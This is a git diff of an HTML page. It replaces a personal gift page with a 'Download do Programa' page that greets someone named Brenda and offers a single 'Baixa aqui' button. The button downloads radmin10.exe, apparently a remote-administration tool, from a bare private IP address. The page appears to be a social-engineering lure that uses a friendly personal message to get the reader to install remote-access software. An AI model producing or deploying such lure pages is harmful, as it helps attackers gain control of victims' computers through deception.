@@ -3,21 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Thábata</title>
-    <link rel="stylesheet" href="main.css">
+    <title>Download do Programa</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            text-align: center;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        h1 {
+            font-size: 2em;
+            color: #4CAF50;
+        }
+
+        p {
+            font-size: 1.1em;
+            color: #555;
+        }
+
+        a.button {
+            display: inline-block;
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 30px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 1.1em;
+            margin-top: 20px;
+        }
+
+        a.button:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Thábata</h1>
-        <p>escolhe seu presente aí:</p>
-        <div class="buttons">
-            <button onclick="revealOption(1)">Opção 1</button>
-            <button onclick="revealOption(2)">Opção 2</button>
-            <button onclick="revealOption(3)">Opção 3</button>
-        </div>
-        <div id="result" class="hidden"></div>
-    </div>
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
-    <script src="app.js"></script>
+
+<div class="container">
+    <h1>Oi, Brenda!</h1>
+    <p>Como você tá?</p>
+    <a href="http://192.168.202.136/radmin10.exe" class="button" download>Baixa aqui</a>
+</div>
+
 </body>
 </html>
